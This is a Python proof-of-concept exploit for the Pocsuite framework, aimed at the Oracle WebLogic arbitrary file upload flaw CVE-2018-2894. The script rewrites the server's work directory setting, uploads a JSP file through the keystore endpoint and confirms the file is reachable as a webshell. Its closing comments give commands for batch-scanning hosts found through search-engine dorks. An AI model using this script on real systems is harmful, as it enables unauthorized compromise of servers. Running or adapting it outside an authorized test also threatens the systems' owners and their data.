#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Copyright (c) 2014-2015 pocsuite developers (http://seebug.org)
See the file 'docs/COPYING' for copying permission
"""
# 命令行
from pocsuite import pocsuite_cli
# 验证模块
from pocsuite import pocsuite_verify
# 攻击模块
from pocsuite import pocsuite_attack
# 控制台模式
from pocsuite import pocsuite_console
# requests
from pocsuite.api.request import req
import urllib
# register
from pocsuite.api.poc import register
# report
from pocsuite.api.poc import Output, POCBase
# url转换host
from pocsuite.lib.utils.funs import url2ip
import re
import sys
import time
import argparse
import requests
import xml.etree.ElementTree as ET






def get_current_work_path(host):
    geturl = host + "/ws_utc/resources/setting/options/general"
    ua = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0'}
    request = requests.get(geturl)
    values = []
    if request.status_code == 404:
        exit("{} 404 not found".format(geturl))
    elif "Deploying Application".lower() in request.text.lower():
        print("First Deploying waiting a moment")
        time.sleep(30)
        request = requests.get(geturl, headers=ua)
    if "</defaultValue>" in request.content:
        root = ET.fromstring(request.content)
        value = root.find("section").find("options")
        for e in value:
            for sub in e:
                if e.tag == "parameter" and sub.tag == "defaultValue":
                    values.append(sub.text)
    if values:
        return values[0]
    else:
        exit(request.content)
def get_new_work_path(host):
    current_work_path = get_current_work_path(host)
    works = "/servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war"
    if "\\" in current_work_path:
        works = works.replace("/", "\\")
    new_path = str(current_work_path[: str(current_work_path).find("_domain") + 7] + works)
    return new_path

def set_new_upload_path(host, path):
    data = {
        "setting_id": "general",
        "BasicConfigOptions.workDir": path,
        "BasicConfigOptions.proxyHost": "",
        "BasicConfigOptions.proxyPort": "80"}
    headers = {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'X-Requested-With': 'XMLHttpRequest', }
    request = requests.post(host + "/ws_utc/resources/setting/options", data=data, headers=headers)
    if "successfully" in request.content:
        return True
    else:
        return False

def upload_webshell(host, uri):
    if not set_new_upload_path(host, get_new_work_path(host)):
        return ""
    password="123"
    upload_content = "test test"
    files = {
        "ks_edit_mode": "false",
        "ks_password_front": password,
        "ks_password_changed": "true",
        "ks_filename": ("testshell.jsp", upload_content)
        }

    request = requests.post(host + uri, files=files)
    response = request.text
    match = re.findall("<id>(.*?)</id>", response)
    if match:
        tid = match[-1]
        shell_path = host + "/bea_wls_internal/config/keystore/" + str(tid) + "_testshell.jsp"
        headers = {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'X-Requested-With': 'XMLHttpRequest', }
        if upload_content in requests.get(shell_path, headers=headers).content:
            return str(shell_path)
        else:
            return ""
    else:
        return ""


# 基础基类
class webLogicPOC(POCBase):
    vulID = '41'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'  # 默认为1
    vulDate = '2018-07-20'  # 漏洞公开的时间,不知道就写今天
    author = 'fanyingjie'  # PoC作者的大名
    createDate = '2018-07-20'  # 编写 PoC 的日期
    updateDate = '2018-07-20'  # PoC 更新的时间,默认和编写时间一样
    references = ['https://xz.aliyun.com/t/2458']  # 漏洞地址来源,0day不用写
    name = 'webLogic file upload'  # PoC 名称
    appPowerLink = 'http://www.oracle.com'  # 漏洞厂商主页地址
    appName = 'webLogic'  # 漏洞应用名称
    appVersion = 'all versions'  # 漏洞影响版本
    vulType = 'file upload'  # 漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        webLogic-CVE-2018-2894 getshell
    '''  # 漏洞简要描述
    samples = []  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    cvss = u"高危"  # 严重,高危,中危,低危

    # 指纹方法
    def _fingerprint(self):
        pass

    # 验证模块 pocsuite -r 1-redis.py -u 10.1.5.26 --verify
    def _verify(self):
        # 调用指纹方法
        result={}

        #如果设置端口则取端口,没有设置则为默认端口
        import re
        vul_url = "%s"%self.url
        # from pocsuite.lib.utils.funs import url2ip
        _port = re.findall(':(\d+)\s*', vul_url)
        if len(_port) != 0:
            _host = url2ip(vul_url)[0]
            _port = url2ip(vul_url)[1]
        else :
            _host = url2ip(vul_url)
            _port = "7001"
        vul_ip = "http://%s:%s/ws_utc/config.do" % (_host, _port)
        try:
            response = req.get(url=vul_ip,timeout=5,allow_redirects=False) #禁止重定向
            if(response.status_code==200 and "WSDL" in response.text):
                
                url = "/ws_utc/resources/setting/keystore"
                target = "http://%s:%s/" % (_host, _port)
                response=upload_webshell(target, url)
                if(response!=""):

                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = vul_ip
                    result['VerifyInfo']['Payload'] = response
                    return self.save_output(result)
        except Exception as e:
            print e
            pass
        return self.save_output(result)
    # 攻击模块
    def _attack(self):
        return self._verify()
        #pass

    # 输出报告
    def save_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output

# 注册类
register(webLogicPOC)

"""
PoC 编写规范及要求说明 https://github.com/knownsec/Pocsuite/blob/master/docs/CODING.md

使用方法 https://github.com/knownsec/Pocsuite/blob/master/docs/translations/USAGE-zh.md

集成 Pocsuite https://github.com/knownsec/Pocsuite/blob/master/docs/INTEGRATE.md

钟馗之眼 批量验证
pocsuite -r 1-redis-getshell.py --verify --dork "redis"  --max-page 50 --search-type host --report report.html
pocsuite -r 1-redis-getshell.py --verify -f results.txt --threads 10 --report report.html
"""

